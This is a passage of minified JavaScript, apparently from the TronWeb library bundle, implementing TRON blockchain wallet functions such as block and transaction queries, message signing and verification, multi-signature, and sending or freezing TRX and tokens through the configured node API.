                            timestamp: e.raw_data.timestamp
                        });
                        return r.signature = e.signature,
                        r.visible = e.visible,
                        r
                    } catch (_l) {
                        throw new Error("Error generating a new transaction id.")
                    }
                }
                try {
                    const t = await this.tronWeb.fullNode.request("wallet/getsignweight", e, "post");
                    return "boolean" === typeof e.visible && (t.transaction.transaction.visible = e.visible),
                    function(e, t, r) {
                        if (e.Error)
                            throw new Error(e.Error);
                        if (e.result && e.result.message)
                            throw new Error(lj.toUtf8(e.result.message));
                        if (DL(e, t, r))
                            return e;
                        throw new Error("Invalid transaction")
                    }(t.transaction.transaction, (0,
                    k.A)((0,
                    k.A)({}, e.raw_data.contract[0].parameter.value), {}, {
                        Permission_id: e.raw_data.contract[0].Permission_id
                    }), {
                        data: e.raw_data.data,
                        fee_limit: e.raw_data.fee_limit
                    })
                } catch (_l) {
                    throw new Error("Error generating a new transaction id.")
                }
            }
            async alterTransaction(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (Reflect.has(e, "signature"))
                    throw new Error("You can not extend the expiration of a signed transaction.");
                if (t.data) {
                    if ("hex" !== t.dataFormat && (t.data = lj.toHex(t.data)),
                    t.data = t.data.replace(/^0x/, ""),
                    0 === t.data.length)
                        throw new Error("Invalid data provided");
                    e.raw_data.data = t.data
                }
                if (t.extension) {
                    if (t.extension = parseInt(1e3 * t.extension),
                    isNaN(t.extension) || e.raw_data.expiration + t.extension <= Date.now() + 3e3)
                        throw new Error("Invalid extension provided");
                    e.raw_data.expiration += t.extension
                }
                return await this.newTxID(e, {
                    txLocal: t.txLocal
                })
            }
            async extendExpiration(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                return await this.alterTransaction(e, {
                    extension: t,
                    txLocal: null === r || void 0 === r ? void 0 : r.txLocal
                })
            }
            async addUpdateData(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "utf8"
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                return this.alterTransaction(e, {
                    data: t,
                    dataFormat: r,
                    txLocal: null === n || void 0 === n ? void 0 : n.txLocal
                })
            }
        }
        const XL = "\x19TRON Signed Message:\n32"
          , QL = "\x19Ethereum Signed Message:\n32";
        function ej(e) {
            return lj.address.toHex(e)
        }
        class tj {
            constructor(e) {
                (0,
                CI.A)(this, "tronWeb", void 0),
                (0,
                CI.A)(this, "cache", void 0),
                (0,
                CI.A)(this, "validator", void 0),
                (0,
                CI.A)(this, "signMessage", void 0),
                (0,
                CI.A)(this, "sendAsset", void 0),
                (0,
                CI.A)(this, "send", void 0),
                (0,
                CI.A)(this, "sendTrx", void 0),
                (0,
                CI.A)(this, "broadcast", void 0),
                (0,
                CI.A)(this, "broadcastHex", void 0),
                (0,
                CI.A)(this, "signTransaction", void 0),
                this.tronWeb = e,
                this.cache = {
                    contracts: {}
                },
                this.validator = new UD,
                this.signMessage = this.sign,
                this.sendAsset = this.sendToken,
                this.send = this.sendTransaction,
                this.sendTrx = this.sendTransaction,
                this.broadcast = this.sendRawTransaction,
                this.broadcastHex = this.sendHexTransaction,
                this.signTransaction = this.sign
            }
            _parseToken(e) {
                return (0,
                k.A)((0,
                k.A)({}, e), {}, {
                    name: this.tronWeb.toUtf8(e.name),
                    abbr: e.abbr && this.tronWeb.toUtf8(e.abbr),
                    description: e.description && this.tronWeb.toUtf8(e.description),
                    url: e.url && this.tronWeb.toUtf8(e.url)
                })
            }
            getCurrentBlock() {
                return this.tronWeb.fullNode.request("wallet/getnowblock")
            }
            getConfirmedCurrentBlock() {
                return this.tronWeb.solidityNode.request("walletsolidity/getnowblock")
            }
            async getBlock() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultBlock;
                if (!1 === e)
                    throw new Error("No block identifier provided");
                return "earliest" == e && (e = 0),
                "latest" == e ? this.getCurrentBlock() : isNaN(+e) && WV.isHex(e.toString()) ? this.getBlockByHash(e) : this.getBlockByNumber(e)
            }
            async getBlockByHash(e) {
                const t = await this.tronWeb.fullNode.request("wallet/getblockbyid", {
                    value: e
                }, "post");
                if (!Object.keys(t).length)
                    throw new Error("Block not found");
                return t
            }
            async getBlockByNumber(e) {
                if (!WV.isInteger(e) || e < 0)
                    throw new Error("Invalid block number provided");
                return this.tronWeb.fullNode.request("wallet/getblockbynum", {
                    num: parseInt(e)
                }, "post").then((e => {
                    if (!Object.keys(e).length)
                        throw new Error("Block not found");
                    return e
                }
                ))
            }
            async getBlockTransactionCount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultBlock;
                const {transactions: t=[]} = await this.getBlock(e);
                return t.length
            }
            async getTransactionFromBlock() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultBlock
                  , t = arguments.length > 1 ? arguments[1] : void 0;
                const {transactions: r} = await this.getBlock(e);
                if (!r)
                    throw new Error("Transaction not found in block");
                if (t >= 0 && t < r.length)
                    return r[t];
                throw new Error("Invalid transaction index provided")
            }
            async getTransactionsFromBlock() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultBlock;
                const {transactions: t} = await this.getBlock(e);
                if (!t)
                    throw new Error("Transaction not found in block");
                return t
            }
            async getTransaction(e) {
                const t = await this.tronWeb.fullNode.request("wallet/gettransactionbyid", {
                    value: e
                }, "post");
                if (!Object.keys(t).length)
                    throw new Error("Transaction not found");
                return t
            }
            async getConfirmedTransaction(e) {
                const t = await this.tronWeb.solidityNode.request("walletsolidity/gettransactionbyid", {
                    value: e
                }, "post");
                if (!Object.keys(t).length)
                    throw new Error("Transaction not found");
                return t
            }
            getUnconfirmedTransactionInfo(e) {
                return this.tronWeb.fullNode.request("wallet/gettransactioninfobyid", {
                    value: e
                }, "post")
            }
            getTransactionInfo(e) {
                return this.tronWeb.solidityNode.request("walletsolidity/gettransactioninfobyid", {
                    value: e
                }, "post")
            }
            getTransactionsToAddress() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 30
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                return this.getTransactionsRelated(this.tronWeb.address.toHex(e), "to", t, r)
            }
            getTransactionsFromAddress() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 30
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                return this.getTransactionsRelated(this.tronWeb.address.toHex(e), "from", t, r)
            }
            async getTransactionsRelated() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "all"
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 30
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 0;
                if (this.tronWeb.fullnodeSatisfies(">=4.1.1"))
                    throw new Error("This api is not supported any more");
                if (!["to", "from", "all"].includes(t))
                    throw new Error('Invalid direction provided: Expected "to", "from" or "all"');
                if ("all" == t) {
                    const [t,o] = await Promise.all([this.getTransactionsRelated(e, "from", r, n), this.getTransactionsRelated(e, "to", r, n)]);
                    return [...t.map((e => (e.direction = "from",
                    e))), ...o.map((e => (e.direction = "to",
                    e)))].sort(( (e, t) => t.raw_data.timestamp - e.raw_data.timestamp))
                }
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                if (!WV.isInteger(r) || r < 0 || n && r < 1)
                    throw new Error("Invalid limit provided");
                if (!WV.isInteger(n) || n < 0)
                    throw new Error("Invalid offset provided");
                return e = this.tronWeb.address.toHex(e),
                this.tronWeb.solidityNode.request("walletextension/gettransactions".concat(t, "this"), {
                    account: {
                        address: e
                    },
                    offset: n,
                    limit: r
                }, "post").then((e => {
                    let {transaction: t} = e;
                    return t
                }
                ))
            }
            async getAccount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex;
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return e = this.tronWeb.address.toHex(e),
                this.tronWeb.solidityNode.request("walletsolidity/getaccount", {
                    address: e
                }, "post")
            }
            getAccountById(e) {
                return this.getAccountInfoById(e, {
                    confirmed: !0
                })
            }
            async getAccountInfoById(e, t) {
                return this.validator.notValid([{
                    name: "accountId",
                    type: "hex",
                    value: e
                }, {
                    name: "accountId",
                    type: "string",
                    lte: 32,
                    gte: 8,
                    value: e
                }]),
                e.startsWith("0x") && (e = e.slice(2)),
                this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(t.confirmed ? "solidity" : "", "/getaccountbyid"), {
                    account_id: e
                }, "post")
            }
            async getBalance() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex;
                const {balance: t=0} = await this.getAccount(e);
                return t
            }
            async getUnconfirmedAccount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex;
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return e = this.tronWeb.address.toHex(e),
                this.tronWeb.fullNode.request("wallet/getaccount", {
                    address: e
                }, "post")
            }
            getUnconfirmedAccountById(e) {
                return this.getAccountInfoById(e, {
                    confirmed: !1
                })
            }
            async getUnconfirmedBalance() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex;
                const {balance: t=0} = await this.getUnconfirmedAccount(e);
                return t
            }
            async getBandwidth() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex;
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return e = this.tronWeb.address.toHex(e),
                this.tronWeb.fullNode.request("wallet/getaccountnet", {
                    address: e
                }, "post").then((e => {
                    let {freeNetUsed: t=0, freeNetLimit: r=0, NetUsed: n=0, NetLimit: o=0} = e;
                    return r - t + (o - n)
                }
                ))
            }
            async getTokensIssuedByAddress() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex;
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return e = this.tronWeb.address.toHex(e),
                this.tronWeb.fullNode.request("wallet/getassetissuebyaccount", {
                    address: e
                }, "post").then((e => {
                    let {assetIssue: t} = e;
                    if (!t)
                        return {};
                    return t.map((e => this._parseToken(e))).reduce(( (e, t) => (e[t.name] = t,
                    e)), {})
                }
                ))
            }
            async getTokenFromID(e) {
                if (WV.isInteger(e) && (e = e.toString()),
                !WV.isString(e) || !e.length)
                    throw new Error("Invalid token ID provided");
                return this.tronWeb.fullNode.request("wallet/getassetissuebyname", {
                    value: this.tronWeb.fromUtf8(e)
                }, "post").then((e => {
                    if (!e.name)
                        throw new Error("Token does not exist");
                    return this._parseToken(e)
                }
                ))
            }
            async listNodes() {
                const {nodes: e=[]} = await this.tronWeb.fullNode.request("wallet/listnodes");
                return e.map((e => {
                    let {address: {host: t, port: r}} = e;
                    return "".concat(this.tronWeb.toUtf8(t), ":").concat(r)
                }
                ))
            }
            async getBlockRange() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 30;
                if (!WV.isInteger(e) || e < 0)
                    throw new Error("Invalid start of range provided");
                if (!WV.isInteger(t) || t < e)
                    throw new Error("Invalid end of range provided");
                if (t + 1 - e > 100)
                    throw new Error("Invalid range size, which should be no more than 100.");
                return this.tronWeb.fullNode.request("wallet/getblockbylimitnext", {
                    startNum: parseInt(e),
                    endNum: parseInt(t) + 1
                }, "post").then((e => {
                    let {block: t=[]} = e;
                    return t
                }
                ))
            }
            async listSuperRepresentatives() {
                const {witnesses: e=[]} = await this.tronWeb.fullNode.request("wallet/listwitnesses");
                return e
            }
            async listTokens() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                if (!WV.isInteger(e) || e < 0 || t && e < 1)
                    throw new Error("Invalid limit provided");
                if (!WV.isInteger(t) || t < 0)
                    throw new Error("Invalid offset provided");
                return e ? this.tronWeb.fullNode.request("wallet/getpaginatedassetissuelist", {
                    offset: parseInt(t),
                    limit: parseInt(e)
                }, "post").then((e => {
                    let {assetIssue: t=[]} = e;
                    return t.map((e => this._parseToken(e)))
                }
                )) : this.tronWeb.fullNode.request("wallet/getassetissuelist").then((e => {
                    let {assetIssue: t=[]} = e;
                    return t.map((e => this._parseToken(e)))
                }
                ))
            }
            async timeUntilNextVoteCycle() {
                const {num: e=-1} = await this.tronWeb.fullNode.request("wallet/getnextmaintenancetime");
                if (-1 == e)
                    throw new Error("Failed to get time until next vote cycle");
                return Math.floor(e / 1e3)
            }
            async getContract(e) {
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid contract address provided");
                if (this.cache.contracts[e])
                    return this.cache.contracts[e];
                e = this.tronWeb.address.toHex(e);
                const t = await this.tronWeb.fullNode.request("wallet/getcontract", {
                    value: e
                });
                if (t.Error)
                    throw new Error("Contract does not exist");
                return this.cache.contracts[e] = t,
                t
            }
            ecRecover(e) {
                return tj.ecRecover(e)
            }
            static ecRecover(e) {
                var t;
                if (!UL(e))
                    throw new Error("Invalid transaction");
                if (null === (t = e.signature) || void 0 === t || !t.length)
                    throw new Error("Transaction is not signed");
                if (1 === e.signature.length) {
                    const t = iV(e.txID, e.signature[0]);
                    return lj.address.fromHex(t)
                }
                return e.signature.map((t => {
                    const r = iV(e.txID, t);
                    return lj.address.fromHex(r)
                }
                ))
            }
            async verifyMessage(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : this.tronWeb.defaultAddress.base58
                  , n = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3];
                if (!WV.isHex(e))
                    throw new Error("Expected hex message input");
                if (tj.verifySignature(e, r, t, n))
                    return !0;
                throw new Error("Signature does not match")
            }
            static verifySignature(e, t, r) {
                let n = !(arguments.length > 3 && void 0 !== arguments[3]) || arguments[3];
                e = e.replace(/^0x/, "");
                const o = [...FB(n ? XL : QL), ...WV.code.hexStr2byteArray(e)]
                  , i = jO(ix(new Uint8Array(o)), PI.from("0x".concat(r.replace(/^0x/, ""))))
                  , s = ZN + i.substr(2);
                return lj.address.fromHex(s) == lj.address.fromHex(t)
            }
            async verifyMessageV2(e, t) {
                return tj.verifyMessageV2(e, t)
            }
            static verifyMessageV2(e, t) {
                return WV.message.verifyMessage(e, t)
            }
            verifyTypedData(e, t, r, n) {
                let o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : this.tronWeb.defaultAddress.base58;
                if (tj.verifyTypedData(e, t, r, n, o))
                    return !0;
                throw new Error("Signature does not match")
            }
            static verifyTypedData(e, t, r, n, o) {
                const i = jO(WV._TypedDataEncoder.hash(e, t, r), PI.from("0x".concat(n.replace(/^0x/, ""))))
                  , s = ZN + i.substr(2);
                return lj.address.fromHex(s) == lj.address.fromHex(o)
            }
            async sign(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultPrivateKey
                  , r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2]
                  , n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3];
                if (WV.isString(e)) {
                    if (!WV.isHex(e))
                        throw new Error("Expected hex message input");
                    return tj.signString(e, t, r)
                }
                if (!WV.isObject(e))
                    throw new Error("Invalid transaction provided");
                if (!n && e.signature)
                    throw new Error("Transaction is already signed");
                if (!n) {
                    if (this.tronWeb.address.toHex(this.tronWeb.address.fromPrivateKey(t)).toLowerCase() !== this.tronWeb.address.toHex(e.raw_data.contract[0].parameter.value.owner_address))
                        throw new Error("Private key does not match address in transaction");
                    if (!UL(e))
                        throw new Error("Invalid transaction")
                }
                return WV.crypto.signTransaction(t, e)
            }
            static signString(e, t) {
                let r = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                e = e.replace(/^0x/, "");
                const n = "0x".concat(t.replace(/^0x/, ""))
                  , o = new DO(n)
                  , i = [...FB(r ? XL : QL), ...WV.code.hexStr2byteArray(e)]
                  , s = ix(new Uint8Array(i))
                  , a = o.sign(s);
                return ["0x", a.r.substring(2), a.s.substring(2), Number(a.v).toString(16)].join("")
            }
            signMessageV2(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultPrivateKey;
                return tj.signMessageV2(e, t)
            }
            static signMessageV2(e, t) {
                return WV.message.signMessage(e, t)
            }
            _signTypedData(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : this.tronWeb.defaultPrivateKey;
                return tj._signTypedData(e, t, r, n)
            }
            static _signTypedData(e, t, r, n) {
                return WV.crypto._signTypedData(e, t, r, n)
            }
            async multiSign(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultPrivateKey
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : 0;
                if (!WV.isObject(e) || !e.raw_data || !e.raw_data.contract)
                    throw new Error("Invalid transaction provided");
                if (!e.raw_data.contract[0].Permission_id && r > 0) {
                    e.raw_data.contract[0].Permission_id = r;
                    const n = this.tronWeb.address.toHex(this.tronWeb.address.fromPrivateKey(t)).toLowerCase()
                      , o = await this.getSignWeight(e, r);
                    if ("PERMISSION_ERROR" === o.result.code)
                        throw new Error(o.result.message);
                    let i = !1;
                    if (o.permission.keys.map((e => {
                        e.address === n && (i = !0)
                    }
                    )),
                    !i)
                        throw new Error(t + " has no permission to sign");
                    if (o.approved_list && -1 != o.approved_list.indexOf(n))
                        throw new Error(t + " already sign transaction");
                    if (!o.transaction || !o.transaction.transaction)
                        throw new Error("Invalid transaction provided");
                    e = o.transaction.transaction,
                    r > 0 && (e.raw_data.contract[0].Permission_id = r)
                }
                if (!UL(e))
                    throw new Error("Invalid transaction");
                return WV.crypto.signTransaction(t, e)
            }
            async getApprovedList(e) {
                if (!WV.isObject(e))
                    throw new Error("Invalid transaction provided");
                return this.tronWeb.fullNode.request("wallet/getapprovedlist", e, "post")
            }
            async getSignWeight(e, t) {
                if (!WV.isObject(e) || !e.raw_data || !e.raw_data.contract)
                    throw new Error("Invalid transaction provided");
                return WV.isInteger(t) ? e.raw_data.contract[0].Permission_id = parseInt(t) : "number" !== typeof e.raw_data.contract[0].Permission_id && (e.raw_data.contract[0].Permission_id = 0),
                this.tronWeb.fullNode.request("wallet/getsignweight", e, "post")
            }
            async sendRawTransaction(e) {
                if (!WV.isObject(e))
                    throw new Error("Invalid transaction provided");
                if (!e.signature || !WV.isArray(e.signature))
                    throw new Error("Transaction is not signed");
                const t = await this.tronWeb.fullNode.request("wallet/broadcasttransaction", e, "post");
                return (0,
                k.A)((0,
                k.A)({}, t), {}, {
                    transaction: e
                })
            }
            async sendHexTransaction(e) {
                if (!WV.isHex(e))
                    throw new Error("Invalid hex transaction provided");
                const t = {
                    transaction: e
                }
                  , r = await this.tronWeb.fullNode.request("wallet/broadcasthex", t, "post");
                return r.result ? (0,
                k.A)((0,
                k.A)({}, r), {}, {
                    transaction: JSON.parse(r.transaction),
                    hexTransaction: e
                }) : r
            }
            async sendTransaction(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                if ("string" === typeof r && (r = {
                    privateKey: r
                }),
                !this.tronWeb.isAddress(e))
                    throw new Error("Invalid recipient provided");
                if (!WV.isInteger(t) || t <= 0)
                    throw new Error("Invalid amount provided");
                if (r = (0,
                k.A)({
                    privateKey: this.tronWeb.defaultPrivateKey,
                    address: this.tronWeb.defaultAddress.hex
                }, r),
                !r.privateKey && !r.address)
                    throw new Error("Function requires either a private key or address to be set");
                const n = r.privateKey ? this.tronWeb.address.fromPrivateKey(r.privateKey) : r.address
                  , o = await this.tronWeb.transactionBuilder.sendTrx(e, t, n)
                  , i = await this.sign(o, r.privateKey);
                return await this.sendRawTransaction(i)
            }
            async sendToken(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                if ("string" === typeof n && (n = {
                    privateKey: n
                }),
                !this.tronWeb.isAddress(e))
                    throw new Error("Invalid recipient provided");
                if (!WV.isInteger(t) || t <= 0)
                    throw new Error("Invalid amount provided");
                if (WV.isInteger(r) && (r = r.toString()),
                !WV.isString(r))
                    throw new Error("Invalid token ID provided");
                if (n = (0,
                k.A)({
                    privateKey: this.tronWeb.defaultPrivateKey,
                    address: this.tronWeb.defaultAddress.hex
                }, n),
                !n.privateKey && !n.address)
                    throw new Error("Function requires either a private key or address to be set");
                const o = n.privateKey ? this.tronWeb.address.fromPrivateKey(n.privateKey) : n.address
                  , i = await this.tronWeb.transactionBuilder.sendToken(e, t, r, o)
                  , s = await this.sign(i, n.privateKey);
                return await this.sendRawTransaction(s)
            }
            async freezeBalance() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 3
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "BANDWIDTH"
                  , n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {}
                  , o = arguments.length > 4 ? arguments[4] : void 0;
                if ("string" === typeof n && (n = {
                    privateKey: n
                }),
                !["BANDWIDTH", "ENERGY"].includes(r))
                    throw new Error('Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"');
                if (!WV.isInteger(e) || e <= 0)
                    throw new Error("Invalid amount provided");
                if (!WV.isInteger(t) || t < 3)
                    throw new Error("Invalid duration provided, minimum of 3 days");
                if (n = (0,
                k.A)({
                    privateKey: this.tronWeb.defaultPrivateKey,
                    address: this.tronWeb.defaultAddress.hex
                }, n),
                !n.privateKey && !n.address)
                    throw new Error("Function requires either a private key or address to be set");
                const i = n.privateKey ? this.tronWeb.address.fromPrivateKey(n.privateKey) : n.address
                  , s = await this.tronWeb.transactionBuilder.freezeBalance(e, t, r, i, o)
                  , a = await this.sign(s, n.privateKey);
                return await this.sendRawTransaction(a)
            }
            async unfreezeBalance() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "BANDWIDTH"
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , r = arguments.length > 2 ? arguments[2] : void 0;
                if ("string" === typeof t && (t = {
                    privateKey: t
                }),
                !["BANDWIDTH", "ENERGY"].includes(e))
                    throw new Error('Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"');
                if (t = (0,
                k.A)({
                    privateKey: this.tronWeb.defaultPrivateKey,
                    address: this.tronWeb.defaultAddress.hex
                }, t),
                !t.privateKey && !t.address)
                    throw new Error("Function requires either a private key or address to be set");
                const n = t.privateKey ? this.tronWeb.address.fromPrivateKey(t.privateKey) : t.address
                  , o = await this.tronWeb.transactionBuilder.unfreezeBalance(e, n, r)
                  , i = await this.sign(o, t.privateKey);
                return await this.sendRawTransaction(i)
            }
            async updateAccount(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if ("string" === typeof t && (t = {
                    privateKey: t
                }),
                !WV.isString(e) || !e.length)
                    throw new Error("Name must be a string");
                if (t = (0,
                k.A)({
                    privateKey: this.tronWeb.defaultPrivateKey,
                    address: this.tronWeb.defaultAddress.hex
                }, t),
                !t.privateKey && !t.address)
                    throw Error("Function requires either a private key or address to be set");
                const r = t.privateKey ? this.tronWeb.address.fromPrivateKey(t.privateKey) : t.address
                  , n = await this.tronWeb.transactionBuilder.updateAccount(e, r)
                  , o = await this.sign(n, t.privateKey);
                return await this.sendRawTransaction(o)
            }
            async getProposal(e) {
                if (!WV.isInteger(e) || e < 0)
                    throw new Error("Invalid proposalID provided");
                return this.tronWeb.fullNode.request("wallet/getproposalbyid", {
                    id: parseInt(e)
                }, "post")
            }
            async listProposals() {
                const {proposals: e=[]} = await this.tronWeb.fullNode.request("wallet/listproposals", {}, "post");
                return e
            }
            async getChainParameters() {
                const {chainParameter: e=[]} = await this.tronWeb.fullNode.request("wallet/getchainparameters", {}, "post");
                return e
            }
            async getAccountResources() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex;
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return this.tronWeb.fullNode.request("wallet/getaccountresource", {
                    address: this.tronWeb.address.toHex(e)
                }, "post")
            }
            async getDelegatedResourceV2() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.tronWeb.defaultAddress.hex
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {
                    confirmed: !0
                };
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                if (!this.tronWeb.isAddress(t))
                    throw new Error("Invalid address provided");
                return this.tronWeb[r.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(r.confirmed ? "solidity" : "", "/getdelegatedresourcev2"), {
                    fromAddress: ej(e),
                    toAddress: ej(t)
                }, "post")
            }
            async getDelegatedResourceAccountIndexV2() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {
                    confirmed: !0
                };
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(t.confirmed ? "solidity" : "", "/getdelegatedresourceaccountindexv2"), {
                    value: ej(e)
                }, "post")
            }
            async getCanDelegatedMaxSize() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "BANDWIDTH"
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {
                    confirmed: !0
                };
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return this.validator.notValid([{
                    name: "resource",
                    type: "resource",
                    value: t,
                    msg: 'Invalid resource provided: Expected "BANDWIDTH" or "ENERGY"'
                }]),
                this.tronWeb[r.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(r.confirmed ? "solidity" : "", "/getcandelegatedmaxsize"), {
                    owner_address: ej(e),
                    type: "ENERGY" === t ? 1 : 0
                }, "post")
            }
            async getAvailableUnfreezeCount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {
                    confirmed: !0
                };
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                return this.tronWeb[t.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(t.confirmed ? "solidity" : "", "/getavailableunfreezecount"), {
                    owner_address: ej(e)
                }, "post")
            }
            async getCanWithdrawUnfreezeAmount() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.tronWeb.defaultAddress.hex
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Date.now()
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {
                    confirmed: !0
                };
                if (!this.tronWeb.isAddress(e))
                    throw new Error("Invalid address provided");
                if (!WV.isInteger(t) || t < 0)
                    throw new Error("Invalid timestamp provided");
                return this.tronWeb[r.confirmed ? "solidityNode" : "fullNode"].request("wallet".concat(r.confirmed ? "solidity" : "", "/getcanwithdrawunfreezeamount"), {
                    owner_address: ej(e),
                    timestamp: t
                }, "post")
            }
            async getExchangeByID(e) {
                if (!WV.isInteger(e) || e < 0)
                    throw new Error("Invalid exchangeID provided");
                return this.tronWeb.fullNode.request("wallet/getexchangebyid", {
                    id: e
                }, "post")
            }
            async listExchanges() {
                return this.tronWeb.fullNode.request("wallet/listexchanges", {}, "post").then((e => {
                    let {exchanges: t=[]} = e;
                    return t
                }
                ))
            }
            async listExchangesPaginated() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 10
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
                return this.tronWeb.fullNode.request("wallet/getpaginatedexchangelist", {
                    limit: e,
                    offset: t
                }, "post").then((e => {
                    let {exchanges: t=[]} = e;
                    return t
                }
                ))
            }
            async getNodeInfo() {
                return this.tronWeb.fullNode.request("wallet/getnodeinfo", {}, "post")
            }
            async getTokenListByName(e) {
                if (WV.isInteger(e) && (e = e.toString()),
                !WV.isString(e) || !e.length)
                    throw new Error("Invalid token ID provided");
                return this.tronWeb.fullNode.request("wallet/getassetissuelistbyname", {
                    value: this.tronWeb.fromUtf8(e)
                }, "post").then((e => {
                    if (Array.isArray(e.assetIssue))
                        return e.assetIssue.map((e => this._parseToken(e)));
                    if (!e.name)
                        throw new Error("Token does not exist");
                    return this._parseToken(e)
                }
                ))
            }
            getTokenByID(e) {
                if (WV.isInteger(e) && (e = e.toString()),
                !WV.isString(e) || !e.length)
                    throw new Error("Invalid token ID provided");
                return this.tronWeb.fullNode.request("wallet/getassetissuebyid", {
                    value: e
                }, "post").then((e => {
                    if (!e.name)
                        throw new Error("Token does not exist");
